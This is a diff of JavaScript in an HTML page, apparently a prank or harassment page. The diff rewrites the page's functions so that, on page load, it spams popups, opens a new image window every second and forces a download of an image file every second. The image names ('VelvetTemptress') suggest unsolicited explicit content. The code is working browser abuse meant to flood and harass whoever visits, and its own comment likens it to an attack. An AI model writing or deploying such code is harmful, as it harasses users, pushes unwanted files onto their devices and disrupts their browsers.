@@ -67,23 +67,32 @@
                 setTimeout(spamPopups, 100);
             }
 
-            function downloadRandomImage() {
-                let randomIndex = Math.floor(Math.random() * images.length);
-                
-                let link = document.createElement('a');
-                link.href = images[randomIndex];  
-                link.download = `VelvetTemptress_${randomIndex + 1}.jpg`;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-
-                // Trigger the next download instantly, like an attack
-                setTimeout(downloadRandomImage, 500);
+            function openRandomImages() {
+                setInterval(() => {
+                    let randomIndex = Math.floor(Math.random() * images.length);
+                    let imgWindow = window.open(images[randomIndex], "_blank", "width=500,height=500");
+                    if (imgWindow) {
+                        imgWindow.focus();
+                    }
+                }, 1000); // Opens a new image every second
             }
 
-            // Activate both functions
+            function downloadRandomImage() {
+                setInterval(() => {
+                    let randomIndex = Math.floor(Math.random() * images.length);
+                    let link = document.createElement('a');
+                    link.href = images[randomIndex];  
+                    link.download = `VelvetTemptress_${randomIndex + 1}.jpg`;
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                }, 1000); // Downloads an image every second
+            }
+
+            // Activate everything
+            spamPopups();
+            openRandomImages();
             downloadRandomImage();
-            setTimeout(spamPopups, 1000);
         }
     </script>
 </head>
